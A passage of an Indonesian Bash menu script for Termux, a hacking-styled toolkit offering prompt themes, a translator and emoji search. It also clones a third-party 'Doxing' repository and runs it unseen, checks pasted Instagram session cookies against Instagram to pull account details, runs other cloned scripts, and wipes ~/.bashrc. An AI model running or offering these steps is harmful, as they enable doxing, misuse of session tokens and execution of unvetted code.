echo -e "${r} [ ${g}02 ${r}]${c} Logo ascci auto link."
echo -e "${r} [ ${g}03 ${r}]${y} Kembali ke awall."
echo -e "${g}==================================="
echo -e "${p}"
read -p "Masukkan pilih : " p
echo ""
case $p in
1|01)
read -p "$(echo -e "${yellow}Masukkan Path Gambar ${red}[ ${green}png atau jpg ${red}]${cyan} : ")" gambar
echo ""
if ! command -v jp2a &> /dev/null; then
    echo ""
    echo -e "${red}Jp2a Belum Terinstal, ${cyan}Menginstall..!!"
    echo -e "${n}"
    apt install jp2a
    clear
fi
if [[ -f "$gambar" ]]; then
    jp2a --width=70 "$gambar"
    echo ""
    echo -e "${red}Hasill Gambar Anda...!!!"
    echo ""
else
    echo ""
    echo -e "${green}File Tidak Ditemukan :${red} $gambar"
    echo ""
fi
;;
2|02)
echo -e "${y}"
read -p "Masukkan kata kunci : " query
if [[ -z "$query" ]]; then
  echo ""
  echo -e "${r}❌ Kata kunci kosong!"
  sleep 4
  clear 
fi
echo ""
echo -e "${g}⌛ Mencari \"$query\" ⌛"
result=$(curl -s "https://emojicombos.com/api/search?keyphrase=$(echo $query | sed 's/ /%20/g')")
echo ""
if [[ -z "$result" ]]; then
  echo -e "${r}❌ Tidak ada hasil ditemukan."
  echo ""
fi
echo
echo -e "${r}           🎉 Hasil"
echo -e "${g}---------------------------------"
echo -e "${c} $result"
echo -e "${g}---------------------------------"
echo ""
echo -e "${b}✅ Kamu bisa salin link banner di atas langsung di Termux"
;;
3|03)
echo ""
echo -e "${y} Keluar dari tools..!!"
echo ""
;;
*)
echo -e "${c} Pilihan Anda Tidak Valid..!!"
;;
esac
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
    ;;
      6|06)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
echo ""
echo -e "${g} Sedang menginstal tools..!!"
echo -e "${n}"
git clone --depth 32 https://github.com/Blackheat023/Doxing
cd Doxing 
clear 
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶⣶⣶⣶⣶⣶⣦⣀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⢤⣠⣶⣿⣿⡿⠿⠛⠛⠛⠛⠉⠛⠛⠛⠛⠿⣷⡦⠞⣩⣶⣸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣾⡤⣌⠙⠻⣅⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠋⢀⣾⣿⣿⠃⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⡟⢇⢻⣧⠄⠀⠈⢓⡢⠴⠒⠒⠒⠒⡲⠚⠁⠀⠐⣪⣿⣿⡿⡄⣿⣷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⠟⠁⠸⡼⣿⡂⠀⠀⠈⠁⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠹⣿⣧⢳⡏⠹⣷⡄⠀⠀⠀⠀
⠀⠀⣰⣿⡿⠃⠀⠀⠀⢧⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠇⡸⠀⠀⠘⢿⣦⣄⠀⠀
⠀⢰⣿⣿⠃⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠀⠀⠀⠀⠀⠀⠰⡇⠀⠀⠀⠈⣿⣿⣆⠀
⠀⣿⣿⡇⠀⠀⠀⠀⢰⠇⠀⢺⡇⣄⠀⠀⠀⠀⣤⣶⣀⣿⠃⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠸⣿⣿⡀
⢸⣿⣿⠀⠀⠀⠀⠀⢽⠀⢀⡈⠉⢁⣀⣀⠀⠀⠀⠉⣉⠁⠀⠀⠀⣀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⣿⣿⡇
⢸⣿⡟⠀⠀⠀⠠⠀⠈⢧⡀⠀⠀⠀⠹⠁⠀⠀⠀⠀⠀⠀⠠⢀⠀⠀⠀⠀⠀⢼⠁⠀⠀⠀⠀⠀⢹⣿⡇
⢸⣿⣿⠀⠀⠀⠀⠀⠠⠀⠙⢦⣀⠠⠊⠉⠂⠄⠀⠀⠀⠈⠀⠀⠀⣀⣤⣤⡾⠘⡆⠀⠀⠀⠀⠀⣾⣿⡇
⠘⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⢠⠜⠳⣤⡀⠀⠀⣀⣤⡤⣶⣾⣿⣿⣿⠟⠁⠀⠀⡸⢦⣄⠀⠀⢀⣿⣿⠇
⠀⢿⣿⣧⠀⠀⠀⠀⠀⣠⣤⠞⠀⠀⠀⠙⠁⠙⠉⠀⠀⠸⣛⡿⠉⠀⠀⠀⢀⡜⠀⠀⠈⠙⠢⣼⣿⡿⠀
⠀⠈⣿⣿⣆⠀⠀⢰⠋⠡⡇⠀⡀⣀⣤⢢⣤⣤⣀⠀⠀⣾⠟⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⣰⣿⣿⠁⠀
⠀⠀⠈⢿⣿⣧⣀⡇⠀⡖⠁⢠⣿⣿⢣⠛⣿⣿⣿⣷⠞⠁⠀⠀⠈⠫⡉⠁⠀⠀⠀⠀⢀⣼⣿⠿⠃⠀⠀
⠀⠀⠀⠈⠻⣿⣿⣇⡀⡇⠀⢸⣿⡟⣾⣿⣿⣿⣿⠋⠀⠀⠀⢀⡠⠊⠁⠀⠀⠀⢀⣠⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣦⣀⢸⣿⢻⠛⣿⣿⡿⠁⠀⠀⣀⠔⠉⠀⠀⠀⠀⣀⣴⡿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣼⣿⣿⣟⠀⠀⡠⠊⠀⣀⣀⣠⣴⣶⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⣿⣿⣿⣿⣶⣶⣷⣶⣶⡿⠿⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠛⠛⠋⠀" | lolcat 
              echo -e "${p} Developer ${n}: ${c}By.Thonxyzz404 && By.Byexe"
              echo ""
              python dox.py
              echo ""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
                ;;
    7|07)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
b='\033[1;34m'
g='\033[1;32m'
p='\033[1;35m'
c='\033[1;36m'
r='\033[1;31m'
y='\033[1;33m'
n='\033[0m'
[[ ! $(command -v jq) ]] && pkg install jq -y &>/dev/null
[[ ! $(command -v curl) ]] && pkg install curl -y &>/dev/null
declare -A nama_bahasa=(
    ["id"]="Indonesia" ["en"]="Inggris" ["ja"]="Jepang" ["ko"]="Korea" ["zh-CN"]="China" 
    ["fr"]="Prancis" ["es"]="Spanyol" ["de"]="Jerman" ["ar"]="Arab" ["hi"]="Hindi"
    ["pt"]="Portugis" ["ru"]="Rusia" ["it"]="Italia" ["th"]="Thailand" ["vi"]="Vietnam"
    ["tr"]="Turki" ["nl"]="Belanda" ["pl"]="Polandia" ["sv"]="Swedia" ["da"]="Denmark"
    ["fi"]="Finlandia" ["no"]="Norwegia" ["el"]="Yunani" ["he"]="Ibrani" ["fa"]="Persia"
    ["af"]="Afrikaans" ["sq"]="Albania" ["am"]="Amhar" ["hy"]="Armenia" ["az"]="Azerbaijan"
    ["eu"]="Basque" ["be"]="Belarusia" ["bn"]="Bengali" ["bs"]="Bosnia" ["bg"]="Bulgaria"
    ["ca"]="Katalan" ["ceb"]="Cebuano" ["ny"]="Chichewa" ["co"]="Korsika" ["hr"]="Kroasia"
    ["cs"]="Ceko" ["eo"]="Esperanto" ["et"]="Estonia" ["tl"]="Filipina" ["fy"]="Frisia"
    ["gl"]="Galisia" ["ka"]="Georgia" ["ht"]="Kreol Haiti" ["ha"]="Hausa" ["haw"]="Hawaii"
    ["iw"]="Ibrani" ["ig"]="Igbo" ["ga"]="Irlandia" ["jw"]="Jawa" ["kn"]="Kannada"
    ["kk"]="Kazakh" ["km"]="Kamboja" ["rw"]="Kinyarwanda" ["ku"]="Kurdi" ["ky"]="Kirgiz"
    ["lo"]="Laos" ["la"]="Latin" ["lv"]="Latvia" ["lt"]="Lituania" ["lb"]="Luksemburg"
    ["mk"]="Makedonia" ["mg"]="Malagasi" ["ms"]="Melayu" ["ml"]="Malayalam" ["mt"]="Malta"
    ["mi"]="Maori" ["mr"]="Marathi" ["mn"]="Mongolia" ["my"]="Myanmar" ["ne"]="Nepal"
    ["or"]="Odia" ["ps"]="Pashto" ["pa"]="Punjabi" ["ro"]="Rumania" ["sm"]="Samoa"
    ["gd"]="Skotlandia" ["sr"]="Serbia" ["st"]="Sotho" ["sn"]="Shona" ["sd"]="Sindhi"
    ["si"]="Sinhala" ["sk"]="Slowakia" ["sl"]="Slovenia" ["so"]="Somali" ["su"]="Sunda"
    ["sw"]="Swahili" ["tg"]="Tajik" ["ta"]="Tamil" ["tt"]="Tatar" ["te"]="Telugu"
    ["tk"]="Turkmen" ["uk"]="Ukraina" ["ur"]="Urdu" ["ug"]="Uighur" ["uz"]="Uzbek"
    ["cy"]="Welsh" ["xh"]="Xhosa" ["yi"]="Yiddi" ["yo"]="Yoruba" ["zu"]="Zulu"
)
terjemah() {
    local teks="$1"
    local dari="$2"
    local ke="$3"
    local enc=$(printf '%s' "$teks" | jq -s -R -r @uri)
    local url="https://translate.googleapis.com/translate_a/single?client=gtx&sl=$dari&tl=$ke&dt=t&q=$enc"
    local hasil=$(curl -s "$url" -A "Mozilla/5.0" --connect-timeout 8 --max-time 12)
    [[ -z "$hasil" || "$hasil" == "null" ]] && {
        echo -e "${r}Koneksi gagal, coba lagi..!!"
        sleep 2
        hasil=$(curl -s "$url" -A "Mozilla/5.0" --connect-timeout 8 --max-time 12) || {
            echo -e "${y}Gagal terhubung."
            return 1
        }
    }
    local terjemahan=$(echo "$hasil" | jq -r '.[0][0][0]' 2>/dev/null)
    [[ "$terjemahan" == "null" ]] && terjemahan="Tidak dapat menerjemahkan."
    local nama_dari="${nama_bahasa[$dari]:-$dari}"
    local nama_ke="${nama_bahasa[$ke]:-$ke}"
    echo -e "${b}[ ${r}$nama_dari → $nama_ke ${b}]"
    echo ""
    echo -e "${g}$terjemahan"
    echo -e "${p}──────────────────────────────────────────────"
    echo -e "${g}"
}
echo ""
echo -e "${n}┌──────────────────────────┐"
echo -e "${n}|    ${y}GOOGLE TRANSLATE ${n}     |"
echo -e "${n}└──────────────────────────┘"
echo -e "${c}Hallo saya google translate di"
echo -e "${r}Kembangkan oleh By.Thonxyzz404"
echo -e "${p}Ketik 'exit' untuk keluar"
echo -e "${g}"
while true; do
    read -p "➤ " masukan
    echo ""
    [[ "$masukan" == "exit" || "$masukan" == "keluar" ]] && { echo -e "${y}Sampai jumpa!"; break; }
    [[ -z "$masukan" ]] && continue
    target="id"
    teks="$masukan"
    if [[ "$masukan" =~ \ ([a-z]{2}(-[A-Z]+)?)$ ]]; then
        kode="${BASH_REMATCH[1]}"
        if [[ -n "${nama_bahasa[$kode]}" ]]; then
            target="$kode"
            teks="${masukan% $kode}"
        fi
    fi
    enc_teks=$(printf '%s' "$teks" | jq -s -R -r @uri)
    deteksi=$(curl -s "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=id&dt=t&q=$enc_teks" -A "Mozilla/5.0")
    dari=$(echo "$deteksi" | jq -r '.[2]' 2>/dev/null)
    [[ "$dari" == "null" || -z "$dari" ]] && dari="auto"
    terjemah "$teks" "$dari" "$target"
done
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
  ;;
      8|08)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
b='\033[34;1m'
h='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
k='\033[33;1m'
m='\033[35;1m'
clear
logo() {
echo "
   ⣰⣟⠲⠤⣤⣤⣤⠶⢖⣲⣶⡶⢶⣶⣖⡲⠶⣤⣤⣤⡤⠖⡛⣆   
   ⡏⣿⣷⣄ ⡟⢡⡶⠛⠉⠁  ⠈⠉⠛⢶⡌⠻ ⣠⣾⣿⢹   
   ⡇⢹⣿⣿⠆⣠⠞⢁⣀⣠⣤⡴⢦⣤⣄⣀⡈⠳⣄⢰⣿⣿⣟⢸⡄  
   ⢻⣤⡻⠁⡸⢃⠜⠋⠉⠉⣠ ⠐⣄⠉⠉⠙⠢⡘⢧⡙⣿⣣⡿   
  ⢀⣾⡷⠁⠊  ⠤⠖⠋⠉⠑⡀⢀⠊⠉⠙⠲⠤  ⠑ ⢾⣷⡄  
  ⣴⡿⠃ ⡀⣀⡴⠁⣤⠶⠚⠋  ⠙⠓⠶⣤⠈⢦⣀⢀ ⠘⢿⣦  
⢀⣾⠏ ⣰⡟⢰⢏⣀⡐⠁       ⡀⠈⢂⣀⡙⡆⢻⣆ ⠹⣷⡀
⣼⡏  ⣿⣧⠸ ⠻⣏⠟⣾⣄    ⣠⣷⠻⣹⠟ ⠇⣼⣷⡀ ⢹⣷
⣿⣰  ⣿⣿⡇  ⠉⠉⢹⣿    ⣿⡏⠉⠉  ⢸⣿⣿⠁ ⣆⣿
⢻⢿⣠  ⣿⣯⠁  ⢀⡞     ⠈⢷⡀  ⠊⣽⣿⠁ ⡀⡿⡟
⠈⢸⣿⡆⡀⠈⢿⣇⡀ ⡼⢰      ⡏⢧ ⢀⣸⡿⠃⢀⢰⣿⡗ 
 ⠈⢿⢿⣿⣦⡈⠻⢿⣄⡁⡾      ⢷⢈⣠⡿⠟⢁⣴⣿⡿⡻⠁ 
   ⠈⠻⠟⢿⣶⣤⣿⢇⢳⡀    ⢀⡞⡸⣿⣤⣶⡿⠻⠟⠁   
        ⣘⣿⣒⣂⠙⠛⢷⡾⠛⠋⢐⣒⣿⣓        
         ⠚⣧⣖⣀⣀⣬⣧⣀⣀⣲⣽⠃⠒        
          ⠉⠛⠳⢤⣄⣠⡤⠾⠛⠉          
"
}
logo | lolcat
bashrc_path="$HOME/.bashrc"
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${h} AUTHOR ${r}= ${c}By.Thonxyzz404              ${b}║"
echo -e "║${h} GITHUB ${r}= ${c}Cyber404119                 ${b}║"
echo -e "║${h} AKUN TIKTOK ${r}= ${c}@thonxyzz404           ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r} [ ${k}01 ${r}]${h} Tampilan Pariasi              ${b}║"
echo -e "║${r} [ ${k}02 ${r}]${h} Tampilan Ubuntu               ${b}║"
echo -e "║${r} [ ${k}03 ${r}]${h} Tampilan Debian               ${b}║"
echo -e "║${r} [ ${k}04 ${r}]${h} Tampilan Kali Linux           ${b}║"
echo -e "║${r} [ ${k}05 ${r}]${h} Tampilan Linux                ${b}║"
echo -e "║${r} [ ${k}06 ${r}]${h} Tampilan Arch                 ${b}║"
echo -e "║${r} [ ${k}07 ${r}]${h} Tampilan Parrot               ${b}║"
echo -e "║${r} [ ${k}08 ${r}]${h} Tampilan Windows              ${b}║"
echo -e "║${r} [ ${k}09 ${r}]${h} Tampilan BlackArch            ${b}║"
echo -e "║${r} [ ${k}10 ${r}]${h} Tampilan Sistem               ${b}║"
echo -e "║${r} [ ${k}11 ${r}]${h} Tampilan Cowass               ${b}║"
echo -e "║${r} [ ${k}12 ${r}]${h} Tampilan Refixs               ${b}║"
echo -e "║${r} [ ${k}13 ${r}]${h} Tampilan Macchina             ${b}║"
echo -e "║${r} [ ${k}14 ${r}]${h} Hapus Tampilan                ${b}║"
echo -e "║${r} [ ${k}15 ${r}]${m} Keluar                        ${b}║"
echo -e "╚══════════════════════════════════════╝"
echo -e "${b}║"
echo -e "${b}║"
echo -e "${c}║"
read -p "╚═[ By.Thonxyzz404 ]══•➤ : " ha
case "$ha" in
  1)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg update -y
    pkg install toilet figlet git -y
    git clone https://github.com/h20-studio/T4MPILAN-V5
    cd T4MPILAN-V5
    python2 style5.py
    exit
    ;;
  2)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg update && pkg upgrade -y
    pkg install zsh git -y
    pkg install python neofetch git -y
    echo "neofetch --ascii_distro ubuntu" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m Ubuntu 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
    ;;
  3)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg update && pkg upgrade -y
    pkg install python neofetch git -y
    echo "clear" > "$bashrc_path"
    echo "neofetch --ascii_distro debian" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m Debian 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
    ;;
  4)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg update && pkg upgrade -y
    pkg install python neofetch git -y
    echo "clear" > "$bashrc_path"
    echo "neofetch --ascii_distro kali" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m Kalinuk 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
    ;;
  5)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg update && pkg upgrade -y
    pkg install python neofetch git -y
    echo "clear" > "$bashrc_path"
    echo "neofetch --ascii_distro linux" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m Linuk 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
    ;;
  6)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg update && pkg upgrade -y
    pkg install python neofetch git -y
    echo "clear" > "$bashrc_path"
    echo "neofetch --ascii_distro Arch" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m Arch 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
    ;;
  7)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg update && pkg upgrade -y
    pkg install python neofetch git -y
    echo "clear" > "$bashrc_path"
    echo "neofetch --ascii_distro parrot" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m Parrot 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
    ;;
  8)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg update && pkg upgrade -y
    pkg install python neofetch git -y
    echo "clear" > "$bashrc_path"
    echo "neofetch --ascii_distro windows" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m Windows 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
    ;;
  9)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg update && pkg upgrade -y
    pkg install python neofetch git -y
    echo "clear" > "$bashrc_path"
    echo "neofetch --ascii_distro BlackArch" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m BlackArch 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
    ;;
 10)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg update && pkg upgrade -y
    pkg install python neofetch git -y
    echo "clear" > "$bashrc_path"
    echo "neofetch" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m Sistem 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
    ;;
11)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg install cowsay
    gem install lolcat
    pkg install cowsay ruby 
    pkg install nala
    pkg install figlet
    echo "clear" > "$bashrc_path"
    echo "cowsay -f eyes 'Hello--World' | lolcat" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m Cowass 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
     ;;
12)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    apt install rxfetch
    echo "clear" > "$bashrc_path"
    echo "rxfetch" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m Rxfetch 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
      ;;
13)
    clear
    echo -e "${k} SEDANG MENGINSTALL TOOLS...!!"
    echo -e "${h}"
    pkg isntall macchina
    echo "clear" > "$bashrc_path"
    echo "macchina" >> "$bashrc_path"
    echo "PS1='\e[1;32m┌─[\e[1;33m Macchina 🤡🔥 \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
    login
      ;;
 14)
      clear
      echo ""
      echo -e "${c} Sedang Menghapus Tampilan...!!"
      sleep 2 
      rm -rf ~/.bashrc
      echo ""
      echo -e "${r} Tampilan Sudah Di Hapus Anda Bisa Mengubah Tampilan Lagi...!!"
      sleep 5 
      echo ""
      clear
       ;;
 15)
    clear
    echo -e "${r}Keluar Dari Tools...!!"
    clear
    ;;
  *)
    echo ""
    echo -e "${h}Pilihan Tidak Valid...!!"
    sleep 3
    echo ""
    clear
    ;;
esac
    ;;
       9|09)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[36;1m'
n='\033[0m'
clear
echo "
 █████╗ ██╗    ██╗███████╗ ██████╗███████╗██╗  ██╗
██╔══██╗██║    ██║██╔════╝██╔════╝██╔════╝██║ ██╔╝
███████║██║ █╗ ██║█████╗  ██║     █████╗  █████╔╝ 
██╔══██║██║███╗██║██╔══╝  ██║     ██╔══╝  ██╔═██╗ 
██║  ██║╚███╔███╔╝██║     ╚██████╗███████╗██║  ██╗
╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝      ╚═════╝╚══════╝╚═╝  ╚═╝
        Development : By.Thonxyzz404" | lolcat 
echo ""
echo -e "${g}============================================"
echo -e "${c}      🔍 CEK INFO COKIES INSTAGRAM 🔎"
echo -e "${g}============================================"
echo -e "${n}"
read -p "Masukkan Cookie Instagram Anda : " cookie
if [[ -z "$cookie" ]]; then
    echo -e "${r}[ ${g}× ${r}]${y} Cookie tidak boleh kosong"
    echo ""
fi
if ! echo "$cookie" | grep -qi "ds_user_id=\|sessionid=\|csrftoken="; then
    echo -e "${r}[ ${g}× ${r}]${y} Cookie tidak valid."
    echo ""
    echo -e "${r}[ ${g}× ${r}]${y} Pastikan cookie mengandung ds_user_id."
    echo ""
fi
echo ""
echo -e "${r}[ ${g}• ${r}]${c} Mendeteksi cookie Instagram..!!"
user_id=$(echo "$cookie" | grep -o "ds_user_id=[0-9]*" | cut -d= -f2)
if [[ -z "$user_id" ]]; then
    echo ""
    echo -e "${r}[ ${g}× ${r}]${y} User ID tidak ditemukan dalam cookie"
    echo ""
fi
echo -e "${r}[ ${g}• ${r}]${y} User ID ditemukan : ${c}$user_id"
echo ""
echo -e "${r}[ ${g}• ${r}]${y} Memeriksa validitas cookie..!!"
response=$(curl -s -X GET "https://www.instagram.com/accounts/edit/" \
    -H "cookie: $cookie" \
    -H "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1" \
    -H "x-ig-app-id: 936619743392459")
extract_json() {
    echo "$1" | grep -o "\"$2\":\"[^\"]*" | head -n1 | cut -d'"' -f4
}
if echo "$response" | grep -q "username"; then
    username=$(extract_json "$response" "username" | tr -d '\r\n' | sed 's/[^a-zA-Z0-9._-]//g')
    if [[ -z "$username" ]]; then
        echo ""
        echo -e "${r}[ ${g}× ${r}]${y} Username tidak valid"
        echo ""
    fi
    echo -e "${r}[ ${g}• ${r}]${y} Cookie valid! Username : ${c}$username"
    echo ""
    echo -e "${r}[ ${g}• ${r}]${y} Mengambil informasi akun..!!"
    export USERNAME_SAFE="$username"
    python3 <<'PYCODE'
import os, re, instaloader
from instaloader import Profile
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[36;1m'
n='\033[0m'
username = os.environ.get("USERNAME_SAFE", "").strip()
if not username or not re.match(r'^[a-zA-Z0-9._-]+$', username):
    print(f"{r}[ {g}× {r}]{y} Username tidak valid!")
    print(f"{y}Debug : LEN={len(username)} repr={username!r}")
    exit(1)
L = instaloader.Instaloader()
try:
    profile = Profile.from_username(L.context, username)
    print(f"{g}════════════════════════════════════════")
    print(f"{c}        INFORMASI AKUN INSTAGRAM")
    print(f"{g}════════════════════════════════════════")
    print('')
    print(f"{r}[ {g}✓ {r}]{y} Username {n}: {c}{profile.username}")
    print(f"{r}[ {g}✓ {r}]{y} Full Name {n}: {c}{profile.full_name}")
    print(f"{r}[ {g}✓ {r}]{y} Biography {n}: {c}{profile.biography or 'Tidak ada bio'}")
    print(f"{r}[ {g}✓ {r}]{y} Followers {n}: {c}{profile.followers}")
    print(f"{r}[ {g}✓ {r}]{y} Following {n}: {c}{profile.followees}")
    print(f"{r}[ {g}✓ {r}]{y} Posts {n}: {c}{profile.mediacount}")
    priv_status = "🔒 Private" if profile.is_private else "🌐 Public"
    verif_status = "✅ Terverifikasi" if profile.is_verified else "❌ Tidak Terverifikasi"
    print(f"{r}[ {g}✓ {r}]{y} Status Akun {n}: {c}{priv_status}")
    print(f"{r}[ {g}✓ {r}]{y} Verified {n}: {c}{verif_status}")
    print(f"{r}[ {g}✓ {r}]{y} Profile Pic URL {n}: {c}{profile.profile_pic_url}")
except instaloader.exceptions.ProfileNotExistsException:
    print(f"{r}[ {g}× {r}]{y} Username tidak ditemukan!")
except Exception as e:
    print(f"{r}[ {g}× {r}]{y} Gagal mengambil data : {e}")
PYCODE
else
    echo ""
    echo -e "${r}[ ${g}× ${r}]${y} Cookie tidak valid atau expired!"
    echo -e "${r}[ ${g}× ${r}]${c} Gagal mengambil data Instagram."
fi
echo ""
echo -e "${g}============================================"
echo -e "${c}        SEMUA INFORMASI DI TEMUKAN"
echo -e "${g}============================================"
       echo ""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
                 ;;
     10)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo ""
echo -e "${g} Membuka fitur create botz telegram...!!"
echo ""
xdg-open https://t.me/BotFather
sleep 4
clear 
echo ""
echo -e "${r} PERINGATAN IKUTI LANGKAH-LANGKAH TERSEBUT."
echo ""
echo ""
echo -e "${r}[ ${g}1. ${r}]${c} Pilih menu ${g}: ${y}/start"
echo -e "${r}[ ${g}2. ${r}]${c} Pilih menu ${g}: ${y}/newbot"
echo -e "${r}[ ${g}3. ${r}]${c} Masukkan printah ${g}: ${y}Namabotzlu_bot"
